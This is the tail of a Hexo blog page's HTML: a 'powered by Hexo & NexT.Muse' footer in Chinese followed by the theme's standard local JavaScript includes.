  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
